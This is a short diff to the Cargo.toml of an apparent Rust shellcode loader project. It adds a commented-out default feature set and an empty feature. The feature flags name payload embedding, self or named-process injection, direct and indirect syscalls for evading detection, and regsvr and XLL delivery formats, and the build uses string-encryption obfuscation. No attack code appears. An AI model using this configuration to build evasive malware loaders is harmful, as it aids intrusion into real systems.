@@ -20,10 +20,12 @@ litcrypt = "0.3.0"
 rand = "0.8.5"
 
 [features]
+#default = ["payload_bin", "inject_proc_name", "syscall_indirect"]
 #default = ["payload_bin", "inject_self", "syscall_direct"]
 no_console = []
 regsvr = []
 xll = []
+none = []
 #syscall types
 syscall_direct = []
 syscall_indirect = []
